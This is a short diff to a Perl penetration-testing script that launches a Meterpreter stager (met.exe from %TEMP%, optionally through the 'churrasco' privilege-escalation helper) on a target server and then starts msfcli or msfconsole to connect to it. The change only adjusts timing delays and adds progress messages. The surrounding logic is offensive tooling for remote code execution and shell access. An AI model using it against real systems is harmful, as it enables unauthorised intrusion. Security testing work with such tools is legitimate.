@@ -205,7 +205,7 @@ sub metasploit
 	my $delayclient = 0;
 	my $delayserver = 0;
 	if ($conn eq "bind_tcp") {
-		$delayclient = 5;
+		$delayclient = 3;
 	} else {
 		$delayserver = $conf->{'msfserverdelay'}; # msfconsole can take a while to start
 	}
@@ -214,7 +214,10 @@ sub metasploit
 	my $pid = fork();
 	if ($pid == 0) {
 		# Launch met.exe 
-		sleep($delayserver);
+		if ($delayserver > 0) {
+			print "[+] waiting ".$delayserver." seconds before running the stager on the server\n"; 
+			sleep($delayserver);
+		}
 		$cmd = "%TEMP%\\".$exe.".exe";
 		if ($conf->{'churrasco'} == 1) {
 			$cmd = usechurrasco($cmd);
@@ -224,7 +227,10 @@ sub metasploit
 		exit(0);
 	}
 	# This is the parent
-	sleep($delayclient);
+	if ($delayclient > 0) {
+		print "[+] waiting ".$delayclient." seconds before starting ".$conf->{'msfclient'}."\n";
+		sleep($delayclient);
+	}
 	if ($conf->{'msfclient'} eq "msfcli") {
 		runmsfcli($msfcli, $payload, $conn, $port, $host2);
 	} else {
@@ -260,7 +266,7 @@ sub runmsfconsole
 	my $payload = $_[1];
 	my $conn = $_[2];
 	my $port = $_[3];
-	my $host2 = $_[4];
+ 	my $host2 = $_[4];
 	# create the script
 	my $rcscript = -1;
 	while ($rcscript == -1) {
